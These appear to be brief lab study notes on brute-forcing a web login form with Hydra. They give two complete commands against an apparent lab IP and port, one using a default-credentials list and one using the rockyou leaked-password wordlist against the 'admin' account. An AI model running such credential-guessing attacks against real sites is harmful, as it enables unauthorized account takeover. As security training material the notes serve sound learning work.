#BruteForcing #HydraSoftware #LoginFormAttack 

### Default Credentials
Using *ftp-betterdefaultpasslist.txt* to test if one of the accounts is registered in the web application.
``` bash
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```
### Password Wordlist
Since default credential brute forcing did not work, we can try with a specified user. Usernames like *admin, administrator, wpadmin, root, adm* are unchanged. To specify the username *admin*.
``` bash
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```